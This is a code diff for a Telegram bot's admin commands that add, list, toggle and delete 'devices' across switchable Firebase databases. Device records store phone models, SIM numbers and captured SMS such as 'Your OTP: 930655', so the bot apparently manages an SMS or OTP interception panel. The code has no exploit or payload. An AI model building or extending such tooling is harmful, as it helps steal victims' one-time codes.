@@ -4,13 +4,10 @@ from firebase.config import *
 from database.db_manager import *
 from utils.helpers import *
 
-# Conversation states
 ADD_DEVICE = 1
 
 async def admin_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Show admin panel"""
     user_id = update.effective_user.id
-    
     if not is_admin(user_id):
         await update.message.reply_text("⛔ Unauthorized access.")
         return
@@ -35,7 +32,6 @@ async def admin_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(panel, reply_markup=reply_markup, parse_mode='Markdown')
 
 async def admin_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Handle admin button callbacks"""
     query = update.callback_query
     await query.answer()
     
@@ -99,7 +95,7 @@ async def admin_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
             "Type /cancel to abort.",
             parse_mode='Markdown'
         )
-        return ConversationHandler.ADD_DEVICE
+        return ADD_DEVICE
     
     elif action == "admin_list":
         devices = get_all_formatted_devices(active_db)
@@ -108,7 +104,7 @@ async def admin_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
             return
         
         msg = f"📋 *All Devices* - `{active_db}`\n\n"
-        for device in devices:
+        for device in devices[:50]:
             msg += f"{device['number']}. {device['status']} `{device['id']}` - {device['model']}\n"
             msg += f"   SIM: `{device['sim']}`\n"
             if len(msg) > 3000:
@@ -127,6 +123,8 @@ async def admin_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         msg = f"🟢 *Online Devices* - `{active_db}`\n\n"
         idx = 1
         for device_id, data in devices.items():
+            if idx > 70:
+                break
             msg += f"{idx}. `{device_id}` - {data.get('model', 'Unknown')}\n"
             msg += f"   SIM: `{data.get('sim', 'N/A')}`\n"
             idx += 1
@@ -166,17 +164,21 @@ async def admin_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         )
 
 async def add_device_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Start adding device"""
     user_id = update.effective_user.id
     if not is_admin(user_id):
         await update.message.reply_text("⛔ Unauthorized.")
         return ConversationHandler.END
     
-    context.user_data['add_device'] = True
+    await update.message.reply_text(
+        "✏️ Send device details:\n"
+        "`ID|Model|From|Time|Message`\n\n"
+        "Example: `d141e9390d148857|motorola edge 50 pro|TM-WowCat-S|2026-05-20 04:55:09|Your OTP: 930655`\n\n"
+        "Type /cancel to abort.",
+        parse_mode='Markdown'
+    )
     return ADD_DEVICE
 
 async def add_device_receive(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Receive and add device"""
     user_id = update.effective_user.id
     if not is_admin(user_id):
         await update.message.reply_text("⛔ Unauthorized.")
@@ -202,7 +204,7 @@ async def add_device_receive(update: Update, context: ContextTypes.DEFAULT_TYPE)
         'from': parts[2].strip(),
         'time': parts[3].strip(),
         'message': parts[4].strip(),
-        'sim': ''  # Offline by default
+        'sim': ''
     }
     
     active_db = get_active_database()
@@ -210,21 +212,20 @@ async def add_device_receive(update: Update, context: ContextTypes.DEFAULT_TYPE)
     
     if success:
         await update.message.reply_text(
-            f"✅ Device added successfully!\n"
-            f"📡 Database: `{active_db}`\n"
+            f"✅ Device added!\n"
+            f"📡 DB: `{active_db}`\n"
             f"🆔 ID: `{device_id}`\n"
             f"📱 Model: {device_data['model']}\n"
-            f"🔴 Status: Offline (no SIM)\n\n"
-            f"Use `/toggle {device_id}` to add SIM and make it online.",
+            f"🔴 Status: Offline\n\n"
+            f"Use `/toggle {device_id} <sim>` to add SIM.",
             parse_mode='Markdown'
         )
     else:
-        await update.message.reply_text(f"❌ Failed to add device to `{active_db}`.", parse_mode='Markdown')
+        await update.message.reply_text(f"❌ Failed to add device.", parse_mode='Markdown')
     
     return ConversationHandler.END
 
 async def toggle_device(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Toggle device online/offline by adding/removing SIM"""
     user_id = update.effective_user.id
     if not is_admin(user_id):
         await update.message.reply_text("⛔ Unauthorized.")
@@ -233,21 +234,20 @@ async def toggle_device(update: Update, context: ContextTypes.DEFAULT_TYPE):
     args = context.args
     if len(args) < 2:
         await update.message.reply_text(
-            "❌ Usage: `/toggle <device_id> <sim_number>`\n"
-            "Example: `/toggle d141e9390d148857 9639640905`\n\n"
-            "To make offline: `/toggle d141e9390d148857 off`",
+            "❌ Usage: `/toggle <id> <sim>`\n"
+            "Example: `/toggle d141e9390d148857 9639640905`\n"
+            "To offline: `/toggle d141e9390d148857 off`",
             parse_mode='Markdown'
         )
         return
     
     device_id = args[0]
     sim_value = args[1]
-    
     active_db = get_active_database()
     device_data = get_device_by_id_from_db(device_id, active_db)
     
     if not device_data:
-        await update.message.reply_text(f"❌ Device `{device_id}` not found in `{active_db}`.", parse_mode='Markdown')
+        await update.message.reply_text(f"❌ Device `{device_id}` not found.", parse_mode='Markdown')
         return
     
     if sim_value.lower() == 'off':
@@ -257,24 +257,17 @@ async def toggle_device(update: Update, context: ContextTypes.DEFAULT_TYPE):
         device_data['sim'] = sim_value
         status = '🟢 Online'
     
-    # Update device
     success = add_device_to_db(device_id, device_data, active_db)
     
     if success:
         await update.message.reply_text(
-            f"✅ Device updated!\n"
-            f"🆔 ID: `{device_id}`\n"
-            f"📡 Database: `{active_db}`\n"
-            f"📱 Model: {device_data['model']}\n"
-            f"Status: {status}\n"
-            f"SIM: `{device_data['sim']}`",
+            f"✅ Updated!\n🆔 `{device_id}`\nStatus: {status}\nSIM: `{device_data['sim']}`",
             parse_mode='Markdown'
         )
     else:
-        await update.message.reply_text(f"❌ Failed to update device.", parse_mode='Markdown')
+        await update.message.reply_text("❌ Failed.", parse_mode='Markdown')
 
 async def delete_device(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Delete device from database"""
     user_id = update.effective_user.id
     if not is_admin(user_id):
         await update.message.reply_text("⛔ Unauthorized.")
@@ -283,27 +276,21 @@ async def delete_device(update: Update, context: ContextTypes.DEFAULT_TYPE):
     args = context.args
     if len(args) < 1:
         await update.message.reply_text(
-            "❌ Usage: `/delete <device_id>`\n"
-            "Example: `/delete d141e9390d148857`",
+            "❌ Usage: `/delete <id>`\nExample: `/delete d141e9390d148857`",
             parse_mode='Markdown'
         )
         return
     
     device_id = args[0]
     active_db = get_active_database()
-    
     success = delete_device_from_db(device_id, active_db)
     
     if success:
-        await update.message.reply_text(
-            f"✅ Device `{device_id}` deleted from `{active_db}`.",
-            parse_mode='Markdown'
-        )
+        await update.message.reply_text(f"✅ Device `{device_id}` deleted from `{active_db}`.", parse_mode='Markdown')
     else:
-        await update.message.reply_text(f"❌ Failed to delete device.", parse_mode='Markdown')
+        await update.message.reply_text("❌ Failed.", parse_mode='Markdown')
 
 async def list_databases(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """List all available databases"""
     user_id = update.effective_user.id
     if not is_admin(user_id):
         await update.message.reply_text("⛔ Unauthorized.")
@@ -321,7 +308,6 @@ async def list_databases(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(msg, parse_mode='Markdown')
 
 async def switch_database(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Switch active database"""
     user_id = update.effective_user.id
     if not is_admin(user_id):
         await update.message.reply_text("⛔ Unauthorized.")
@@ -330,9 +316,7 @@ async def switch_database(update: Update, context: ContextTypes.DEFAULT_TYPE):
     args = context.args
     if len(args) < 1:
         await update.message.reply_text(
-            "❌ Usage: `/switch <database_name>`\n"
-            "Example: `/switch myapp`\n\n"
-            "Use `/databases` to see available databases.",
+            "❌ Usage: `/switch <name>`\nExample: `/switch myapp`\nUse `/databases` to see available.",
             parse_mode='Markdown'
         )
         return
@@ -342,8 +326,7 @@ async def switch_database(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     if db_name not in databases:
         await update.message.reply_text(
-            f"❌ Database `{db_name}` not found.\n"
-            f"Available: {', '.join(databases.keys())}",
+            f"❌ Database `{db_name}` not found.\nAvailable: {', '.join(databases.keys())}",
             parse_mode='Markdown'
         )
         return
@@ -353,8 +336,93 @@ async def switch_database(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     await update.message.reply_text(
         f"✅ Switched to `{db_name}`\n\n"
-        f"Total Devices: {stats['total']}\n"
-        f"🟢 Online: {stats['online']}\n"
-        f"🔴 Offline: {stats['offline']}",
+        f"Total: {stats['total']}\n🟢 Online: {stats['online']}\n🔴 Offline: {stats['offline']}",
+        parse_mode='Markdown'
+    )
+
+async def admin_list_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    if not is_admin(user_id):
+        await update.message.reply_text("⛔ Unauthorized.")
+        return
+    
+    active_db = get_active_database()
+    devices = get_all_formatted_devices(active_db)
+    if not devices:
+        await update.message.reply_text("📭 No devices.")
+        return
+    
+    msg = f"📋 *All Devices* - `{active_db}`\n\n"
+    for device in devices[:50]:
+        msg += f"{device['number']}. {device['status']} `{device['id']}` - {device['model']}\n"
+        if len(msg) > 3000:
+            await update.message.reply_text(msg, parse_mode='Markdown')
+            msg = ""
+    
+    if msg:
+        await update.message.reply_text(msg, parse_mode='Markdown')
+
+async def admin_online_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    if not is_admin(user_id):
+        await update.message.reply_text("⛔ Unauthorized.")
+        return
+    
+    active_db = get_active_database()
+    devices = get_online_devices_from_db(active_db)
+    if not devices:
+        await update.message.reply_text("🟢 No online devices.")
+        return
+    
+    msg = f"🟢 *Online Devices* - `{active_db}`\n\n"
+    idx = 1
+    for device_id, data in devices.items():
+        if idx > 70:
+            break
+        msg += f"{idx}. `{device_id}` - {data.get('model', 'Unknown')}\n"
+        msg += f"   SIM: `{data.get('sim', 'N/A')}`\n"
+        idx += 1
+        if len(msg) > 3000:
+            await update.message.reply_text(msg, parse_mode='Markdown')
+            msg = ""
+    
+    if msg:
+        await update.message.reply_text(msg, parse_mode='Markdown')
+
+async def admin_offline_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    if not is_admin(user_id):
+        await update.message.reply_text("⛔ Unauthorized.")
+        return
+    
+    active_db = get_active_database()
+    devices = get_offline_devices_from_db(active_db)
+    if not devices:
+        await update.message.reply_text("🔴 No offline devices.")
+        return
+    
+    msg = f"🔴 *Offline Devices* - `{active_db}`\n\n"
+    idx = 1
+    for device_id, data in devices.items():
+        msg += f"{idx}. `{device_id}` - {data.get('model', 'Unknown')}\n"
+        idx += 1
+        if len(msg) > 3000:
+            await update.message.reply_text(msg, parse_mode='Markdown')
+            msg = ""
+    
+    if msg:
+        await update.message.reply_text(msg, parse_mode='Markdown')
+
+async def admin_stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    if not is_admin(user_id):
+        await update.message.reply_text("⛔ Unauthorized.")
+        return
+    
+    active_db = get_active_database()
+    stats = get_device_count_from_db(active_db)
+    await update.message.reply_text(
+        f"📊 *Stats* - `{active_db}`\n\n"
+        f"Total: {stats['total']}\n🟢 Online: {stats['online']}\n🔴 Offline: {stats['offline']}",
         parse_mode='Markdown'
     )
